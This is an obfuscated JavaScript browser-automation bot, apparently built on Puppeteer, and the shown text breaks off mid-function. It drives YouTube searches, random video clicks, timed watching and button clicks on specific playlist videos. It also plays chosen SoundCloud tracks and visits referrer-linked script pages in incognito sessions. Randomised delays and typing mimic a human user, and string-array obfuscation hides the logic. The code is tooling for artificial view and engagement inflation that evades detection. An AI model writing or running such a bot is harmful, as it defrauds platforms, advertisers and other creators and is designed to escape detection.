const W = c,
  V = d,
  T = b;

function a() {
  const bl = [
    'cripts/385',
    'aIr9WP84WORdTZK8W4S',
    'yees,mrbea',
    'W5tdOhpcPSkq',
    'DgH1yI5JB20',
    'getAttribu',
    'WPldLLu9r1a',
    'Bsf9W61B',
    'prototype',
    'DhmGBMv3CYb0BW',
    'yKLyCu5QDhnfzG',
    'bSk/h8oBfCkrbrFcRCk2',
    'lCkffSkclCkjnwNdJmo3',
    '6auDBi-D2H',
    'gmopBg9DW4eHW5PpDq',
    'BSkWFvS',
    'ymofWQ7dJSkAe8oHz8oJha',
    'W4pdI0RdSmkHWQRcLmoJhCkG',
    'WORcKfBcJfFcRCoZmmogoG',
    'W78bW67cGKhcO8ojWOhdUIS',
    ',mister\x20be',
    'zs8Q',
    'WQ/cNLRdRrT1WRLFW4GN',
    'WPZdIHiez0BdOLZdPWy'
  ];
  a = function() {
    return bl;
  };
  return a();
}

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x355 * 0xb + -0x7bc + -0x1 * 0x1cea))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x1 * 0x2275 + -0xee9 + -0x138c), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x2400 + -0x113 + -0x1 * 0x22ed);
    let h = e[f];
    if (b['BgoJEx'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x65 * -0x59 + -0x2 * -0xfe9 + -0x1 * -0x34b, s, t, u = -0xb65 + -0x1f49 + -0x3 * -0xe3a; t = n['charAt'](u++); ~t && (s = r % (0x16f1 + -0x2 * -0xe83 + -0x27 * 0x155) ? s * (0x19ca + 0x292 + -0x202 * 0xe) + t : t, r++ % (-0x1317 + 0x7f * 0x2a + 0x1bb * -0x1)) ? p += String['fromCharCode'](0x12a8 + -0x23 * -0x4e + -0x1 * 0x1c53 & s >> (-(-0x1b06 + -0x5 * -0x55e + 0x32) * r & -0x1 * -0x14ef + -0x1ad2 + -0x1 * -0x5e9)) : 0x2 * -0x60d + 0x7 * 0x49 + 0xa1b) {
          t = o['indexOf'](t);
        }
        for (let v = -0x2597 + -0x1 * 0x26e4 + 0x4c7b, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x1822 + 0x231c + -0xaea))['slice'](-(-0x1abc + 0x18c2 * -0x1 + 0x3380));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x1 * -0x10ad + 0x8f3 + -0x19a0,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x15d1 + -0x1fa8 + 0xb * 0xe5; u < 0x19ce + 0x23b7 + -0x3c85 * 0x1; u++) {
          p[u] = u;
        }
        for (u = 0x3bb * 0x3 + 0xf * 0x1b7 + 0x3b1 * -0xa; u < -0xdd2 + 0x2060 + -0x118e; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x23ca + 0x1 * 0x1731 + 0xd99), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x3 * 0x764 + 0x380 * 0x7 + -0x95 * 0x4, q = -0x1f9d + -0x1e10 + 0x3dad;
        for (let v = 0x2376 + -0x12ec + -0x108a; v < n['length']; v++) {
          u = (u + (0x19 * 0x2 + 0x20ec + 0xad * -0x31)) % (-0x44 * 0x26 + 0xe5b + -0x343), q = (q + p[u]) % (0xa * 0x352 + -0x1c * 0x33 + -0x4 * 0x6a8), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1 * -0xf7c + 0x47 * 0x75 + -0x2eef)]);
        }
        return t;
      };
      b['bvCmnm'] = m, c = arguments, b['BgoJEx'] = !![];
    }
    const j = e[0xd36 + 0xda7 + -0xd * 0x211],
      k = f + j,
      l = c[k];
    return !l ? (b['jqJNFA'] === undefined && (b['jqJNFA'] = !![]), h = b['bvCmnm'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0xbbdb + -0x2 * 0x4bd3 + 0x50fb * 0x1 + (0x1d * 0x2dc + 0x6433 + -0x47 * 0x1c1) * random()) : await standardWaitForNetIdle(f), await wait(0x1230 + -0x1f * 0x3d + -0x3 * -0x2e9 + (-0x1be6 + -0x2 * -0x14ef + 0x1918) * random()), 0x19c6 + 0x4 * -0x8a + 0x41 * -0x5d;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x11f0 + -0x146b + 0x1603), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x23fb + -0x18d + -0x1 * 0x226d;
}
async function randomWait() {
  return await wait(-0x23e0 + -0x20f9 + 0x5861 + (0x2170 + 0xf * 0x275 + -0x5 * 0xa27) * random()), -0x351 * 0x3 + -0x1c29 + 0x261d;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x10a * 0x1 + 0x1105 + -0x120f, 0x18b * 0x17 + 0x16f1 * -0x1 + 0x5 * -0x281), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0xbcc3 + -0x2 * -0xc4bd + -0x15bdd) * getRandomInt(-0xcb6 * 0x2 + 0x3 * -0xbee + 0x3d38, -0x3 * 0x764 + 0x380 * 0x7 + -0xc5 * 0x3), h)), -0x1f9d + -0x1e10 + 0x3dae;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x2400 + -0x113 + -0x1 * 0x22ed);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x2376 + -0x12ec + -0x108a;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x19 * 0x2 + 0x20ec + 0xad * -0x31]['split']('\x20');
    for (let k = -0x44 * 0x26 + 0xe5b + -0x443; k < i['length']; k += 0xa * 0x352 + -0x1c * 0x33 + -0x5 * 0x586)
      j += i[k] * h[i[k + (-0x1 * -0xf7c + 0x47 * 0x75 + -0x2fee)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0xd36 + 0xda7 + -0x1 * 0x1ad7)['map'](l => Array['from'](l['children']))['flat'](-0x7 * 0x1ed + -0x784 + 0x1500)['map'](l => l['childNodes'][0x1c69 + 0xa32 + -0x269a]['childNodes'][0x36 * 0x5e + 0x91a * -0x4 + -0x84a * -0x2]['childNodes'][-0xb9 * 0x30 + 0x2 * 0x9a7 + -0xd * -0x12f]['childNodes'][0x1f * -0x68 + 0x1733 + 0x3 * -0x389]['childNodes'][-0x7a5 * 0x4 + 0x2020 + 0x1 * -0x18b]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x21 * -0xbf + -0x31 * 0x7f + -0x8 * -0x73, -0x17c4 + -0x3f0 + 0x2f3c)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x1a99 + 0xf3f * -0x4 + 0x5cfb);
  const h = await getMaxTime(f),
    i = Math['min']((-0x4 * -0x291a + 0x1df * -0xb7 + 0xe5 * 0x1cd) * getRandomInt(0xbdb * 0x2 + 0xd8c + 0x10 * -0x254, 0x2c4 * 0x2 + 0x81f + -0xda2), h);
  return await wait(i), -0x22 * -0x2 + -0x1d * -0x76 + -0xda1;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x13f9 + -0x1 * -0x103 + -0x14fc]['children'][0x4 * 0x96d + 0x22d9 + -0x488d]['children'][-0x10f + -0x10f + 0x21e]['children'][-0x5cb * 0x1 + -0x99 * -0x1 + 0x1 * 0x532]['children'][0x1098 + -0x1cdc + 0x14 * 0x9d]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x2 * -0x1091 + 0x512 + -0x2633;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x10a3 + -0x4 * 0x295 + 0x95 * 0x2f + (-0x7 * -0x3e5 + -0x1 * -0x8e1 + -0x23f2) * random()
  }), await wait(-0x185 * 0x1 + -0x1 * -0x1451 + -0x10d8 + (-0x63d * 0x1 + -0x4e0 + 0xc49) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x1d46 + 0x2534 + -0x7ec]['childNodes'][0x2 * -0x7be + 0xe03 + 0x17a]['childNodes'][-0x2e2 + -0xc5 * 0x11 + 0x1c * 0x92]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x1 * 0x2447 + 0x8e2 + 0x1b6a]['childNodes'][0x16 * 0x16c + -0x43c * 0x4 + 0x396 * -0x4]['childNodes'][0x1cf5 * -0x1 + -0x23b9 + -0x1e * -0x228]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x5b2 + -0x25 * -0x11 + -0x826),
          r = 0x4 * -0x727 + -0x1e21 + 0x3abd;
        for (let u = 0x883 + 0x15b * -0x16 + 0x154f; u < q['length']; u += 0x1c4e + 0x2 * 0x1069 + -0x1 * 0x3d1e)
          r += q[u] * k[q[u + (0xe0a + 0x1a8 + 0x1 * -0xfb1)]];
        return r;
      }(n);
  });
  await wait((-0x4fbc + -0x2a88 + 0xb4dc) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x36b * 0x1b + -0xc5 * 0x67 + 0x7a2 * 0x1d) * getRandomInt(-0x1ca1 + 0x4fb + 0x17a7, -0x13d * 0x15 + -0x7 * 0x2d7 + 0x2dec), h + (0x634 + -0x21f9 * 0x1 + 0x1 * 0x2f4d));
  return await wait(i), -0x2 * -0x1307 + 0x13ac + 0x83f * -0x7;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x2063 * -0x1 + -0x261f * -0x1 + 0x4 * -0x16f), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x6e3 + -0x11 * 0x1cc + 0x1 * 0x3127 + (0x1d48 + -0x72 * -0x6 + 0x14 * -0x167) * Math['random']());
    });
  }, -0xd * 0x2d1 + -0x1 * 0x14a2 + 0x5497);
  await wait(-0x4b872 + 0x2 * -0x17c05 + 0xc445c);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x129a8 * 0x1 + 0xd2e3 + -0x10e7 * -0x13) * getRandomInt(-0x2062 + -0x26fd * 0x1 + 0x4763, 0x22d7 + 0x7be * -0x2 + -0x1342)), clearInterval(h), 0x181 + 0x29 * 0x4a + 0x2 * -0x6ad;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x3ee * -0x1 + -0xf64 + 0xb76;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x6af + -0x93 * 0xe + -0xeba * -0x1;
    await randomWait();
  }
  return 0x569 + -0x27e + -0x2ea;
}

function fetchRandomSC() {
  return Math['random']() <= 0x1c7c + 0x23f6 + -0x4072 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x7b * 0x28 + 0x21 * -0x11d + 0x37f5 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x22b4 + -0x2e * -0xc7 + -0x10e + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0xe37 + 0xced + 0x1b24 * -0x1;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x150cf * 0x1 + 0x156d9 + 0xa9be + getRandomInt(0x5f98 + -0x577b + -0x1 * -0x327b, -0x341d * 0x2 + 0x1adf * -0x8 + 0x1b462));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x3 * -0x92f + -0x16d6 * 0x1 + -0x4b6), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x15cd * 0x1 + 0x77e + 0x1d4b * -0x1;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x2061 + 0xd2b + -0x2d8c, 0x1c2 + -0x9f2 + 0x25 * 0x3a)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x1db0 * -0x1 + 0xae7 + 0x1a99 + floor((-0xcf * -0x20 + -0x1 * -0x161e + -0x2c16) * random()))), log('p2'), log(await s['evaluate'](() => {
        const R = d;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x8 * -0x1f49cf55 + 0x70dd37c2 + -0x2fa1276 * 0x4f),
          -0x966ea2 * 0x1 + 0x3 * 0x999fb + 0xf9a0b1,
          -0x4c04 * 0x2 + -0x65db + -0x679 * -0x3b,
          0x37 * -0x7 + -0x199d + 0x1b9e
        ], y = [
          0x3f * 0xb + -0x25af + 0x2312,
          0x19bf + 0x19ba + 0x6b * -0x7b,
          -0x2 * -0x603 + 0xb95 * 0x1 + -0x47 * 0x55,
          0x8 * 0x47b + 0x13cb + -0x37a3
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x4 * 0x59e + 0x7 * 0x56c + -0x3c6b)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0xdd3 + -0x1a33 + 0x9 * 0x160; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x1b58 + -0x99b + 0x9 * 0x41b) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x20b1 + 0x502 * -0x7 + 0x25d] = A[-0x1 * 0x222f + 0x82d + 0x5e * 0x47] = A[0x10ed + -0xdf4 * 0x2 + 0x26 * 0x4a] = A[0x2 * 0x21e + 0xf26 + -0x1360] = A[-0x20f0 + 0x1a54 + 0x153 * 0x5] = A[-0x16 * -0x95 + -0x2 * 0x437 + -0x45c] = A[-0x1d7b + -0x1d8e + 0x3b0e * 0x1] = A[0x175 * -0x2 + -0x8 * -0x434 + 0xf58 * -0x2] = A[-0x67e * -0x1 + 0xda6 + -0x141d] = A[0x1 * 0x138a + -0x3ed + -0xf95] = A[-0x2532 + 0xba1 + 0x199a] = A[-0x3c7 + 0x2 * 0xb4f + -0x12cd] = A[0xeac + -0x1cf7 + 0xe56] = A[-0x1 * -0xc51 + -0x2c5 + -0x980 * 0x1] = A[-0x22fd + 0xd52 + 0x1 * 0x15b8] = A[0x828 + -0xb8b * -0x1 + 0x2f * -0x6b] = A[-0x1d44 * 0x1 + -0x49 * 0x35 + 0x2c70] = -0x1 * 0x603 + 0x1406 + -0xe03, this['blocks'] = A) : this['blocks'] = [
                -0x26d8 + 0xe87 + 0x3 * 0x81b,
                -0x917 * -0x1 + -0x1014 + 0x1 * 0x6fd,
                0x109a + 0x1 * -0x115b + -0xc1 * -0x1,
                0x1 * 0x502 + -0x87 * 0x2f + 0x13c7,
                0x1913 + -0x5 * -0x777 + -0x3e66,
                -0x203f + 0x5b5 * -0x2 + 0x2ba9,
                -0x1e35 + -0x8f0 + -0x38f * -0xb,
                0x723 + 0x7ca + 0xeed * -0x1,
                0xd98 + 0xcd * 0x1e + -0x259e,
                0x82 + -0x17bb + 0x1739,
                -0xb33 + 0x1 * 0x6e6 + 0x44d,
                0x1d3a + 0x401 + -0x213b,
                -0x1 * -0x13f9 + 0x1651 + -0x2a4a,
                -0x1c3c + 0x16 * -0x7f + 0x2726,
                -0x2199 + -0x71f + 0x28b8 * 0x1,
                -0x43 * -0x40 + 0x3 * -0x32b + -0x73f,
                -0x2235 + -0xd * -0x1df + 0x9e2
              ], this['h0'] = -0x95f7afb * -0x3 + 0xc2854b71 + -0x85307 * 0xe57, this['h1'] = -0x1718b33a3 + -0x1a931eb97 + 0x1f * 0x215f50dd, this['h2'] = -0x1cf6861 + 0x4 * 0x2886b2f6 + -0x7908679, this['h3'] = 0x2 * -0xfabb5c7 + -0x5 * 0x1e31120 + 0x38f915a4, this['h4'] = 0x166e6e1ec + -0x2 * -0x58adf836 + -0x38bd52bc * 0x6, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0xb22 + 0x7 * 0x335 + 0x2195 * -0x1, this['finalized'] = this['hashed'] = 0x80e + -0x1600 + 0xdf2, this['first'] = -0x14b8 + 0x41d + 0x109c;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x1e6b + -0x1 * 0x114 + -0x1d57, O = J['length'] || -0x1770 + -0x166a + 0x2dda, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x6ee * -0x3 + 0x1 * -0x2669 + 0x23 * 0x1b1, P[0x12ea + 0x2 * -0x886 + -0xef * 0x2] = this['block'], P[0x213 * 0x9 + -0xe4a + -0x451] = P[0x2eb * -0x1 + -0x1 * 0x2641 + 0x292d] = P[0xa3 * -0x1e + -0x231 + 0x7 * 0x30b] = P[-0x1 * -0x126a + -0x194c + 0x6e5] = P[0x2037 + -0x1 * -0x26cf + -0x2381 * 0x2] = P[0x1978 + -0x3f1 * 0x2 + 0x1191 * -0x1] = P[0x1 * 0x566 + -0xc4a + 0x6ea] = P[-0x1fa5 + -0x1c94 + -0x3c4 * -0x10] = P[0x2 * 0x9df + 0x926 * 0x1 + -0x2 * 0xe6e] = P[0xaa7 + 0x1 * -0x1d41 + -0x16f * -0xd] = P[0x1626 + -0x26d6 + 0x10ba] = P[-0x2b * 0xda + 0x216b + 0x2 * 0x19f] = P[-0x20ae + 0x23d4 + 0x18d * -0x2] = P[-0x6 * 0x25c + 0x666 + 0x1 * 0x7cf] = P[0x1602 + -0x19b + -0x1459] = P[-0x17 * -0x161 + -0x763 + -0x1845] = -0x19d5 + 0x1eaf * -0x1 + 0x3884), K) {
                    for (N = this['start']; M < O && N < -0x15d9 + -0x98c + 0x1fa5; ++M)
                      P[N >> 0x1 * 0x51b + 0x4 * -0x3fd + -0x18d * -0x7] |= J[M] << y[0x21fb * 0x1 + -0x1690 + -0xb68 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x323 * -0x1 + -0xe2d + 0x2 * 0x8c8; ++M)
                      (L = J['charCodeAt'](M)) < 0x82f * -0x4 + -0x1 * -0x1d07 + 0x435 ? P[N >> -0x15 * 0x19e + -0x17 * -0x164 + 0x1fc] |= L << y[-0x208c * -0x1 + 0x43 * -0x1 + -0x2046 & N++] : L < 0x2663 * 0x1 + -0xce3 * 0x2 + -0x1 * 0x49d ? (P[N >> 0x1fd * -0x1 + -0x73d + 0x93c] |= (-0x5d1 * -0x5 + -0xf59 * -0x1 + 0x1 * -0x2bae | L >> -0x5 * -0x6b + -0xd61 * -0x1 + -0x3 * 0x526) << y[0x1fdd + 0x10 * -0x13c + -0xc1a & N++], P[N >> -0x179c + 0x427 * 0x1 + 0x1377] |= (0xce * 0x1 + -0x305 + -0x2b7 * -0x1 | 0x1 * 0x1119 + 0xe98 + 0xe6 * -0x23 & L) << y[0x241 * -0x11 + -0x127b + 0x38cf & N++]) : L < -0x14e61 * 0x1 + -0x1af2 + 0x24153 || L >= -0x15eb9 + -0x5d4d + 0x29c06 ? (P[N >> 0x3 * -0x25a + -0x183 + 0x893] |= (0x1ec6 + -0x1ba3 + -0x1 * 0x243 | L >> 0x80 * -0x32 + -0x138d + -0x7 * -0x65f) << y[-0xbd * 0x27 + -0x2bc + 0x1f8a & N++], P[N >> 0xd * 0x2e + 0x520 * 0x4 + 0xc * -0x1e7] |= (0x162 + -0x1861 * 0x1 + 0x177f | L >> -0x6b * 0x40 + 0x29 * 0x47 + -0xf67 * -0x1 & -0x17cb * 0x1 + 0x5b7 + 0x1253) << y[0x251f + 0x14cd + -0x39e9 & N++], P[N >> -0x1e66 + -0x257 * -0x8 + 0xbb0] |= (0x1fed + -0x15b4 + -0x9b9 | -0x4cc * 0x7 + -0x1063 + 0x3236 & L) << y[0x1 * 0x4e5 + -0x14eb + 0x5 * 0x335 & N++]) : (L = -0xe01f + -0x3 * 0x9311 + -0x7 * -0x839e + ((0x1699 + -0x206 + -0x1094 & L) << 0x481 * 0x1 + -0x2 * -0x1a8 + -0xb5 * 0xb | -0x5f0 + -0x1 * 0x2606 + 0x1 * 0x2ff5 & J['charCodeAt'](++M)), P[N >> -0x1615 + 0x1113 + 0x504] |= (-0x709 * -0x5 + 0x7f3 + -0x2a30 | L >> 0x1412 + -0x3 * -0x59 + -0x150b) << y[-0x585 + 0x941 + -0x3b9 & N++], P[N >> -0x1dda + 0x1 * 0x54d + 0x188f] |= (-0xc22 + 0x2385 + -0x345 * 0x7 | L >> 0x86f + -0x261d + 0x1dba & 0x1e42 + -0x1464 + -0x99f) << y[0xbbc * 0x1 + 0x20f6 + -0x2caf & N++], P[N >> 0xbb2 + 0x4 * -0x2 + -0xba8] |= (-0x121 * 0x5 + 0x2566 + -0x15 * 0x17d | L >> 0x5 * -0x604 + -0x184b + 0x3665 & 0x71 * -0x37 + -0x20 * 0x7a + 0x27c6) << y[0x15 * -0xad + 0x6c3 + 0x771 & N++], P[N >> -0xd05 + 0x41 * -0x6b + 0x2832] |= (0x159d * -0x1 + 0xba * -0x22 + 0x2ed1 | -0x23fe + -0x1386 + 0x37c3 * 0x1 & L) << y[0x4 * 0x3c7 + 0x1ce4 + -0x2bfd * 0x1 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x43 * -0x89 + 0x3 * -0x2dd + 0x3 * 0xee6 ? (this['block'] = P[0x3d * -0x51 + -0xebc * 0x2 + 0x9 * 0x56d], this['start'] = N - (0x5a * 0x6d + -0x3 * 0x25c + -0x1efe), this['hash'](), this['hashed'] = -0x1776 + 0x8b * 0x3b + -0x892) : this['start'] = N;
                }
                return this['bytes'] > 0x9b * 0x308e94 + 0xa516e104 + 0x3d82cb5f && (this['hBytes'] += this['bytes'] / (-0x88844904 + 0x1c8de9788 + -0x405a4e84) << 0x13c3 + 0x5 * 0x55d + -0x2e94, this['bytes'] = this['bytes'] % (0x505a025 * -0x20 + -0x4e99b1cc + 0x1 * 0x1ef4db66c)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0xd0 + 0x15c1 + -0x1690;
                var J = this['blocks'],
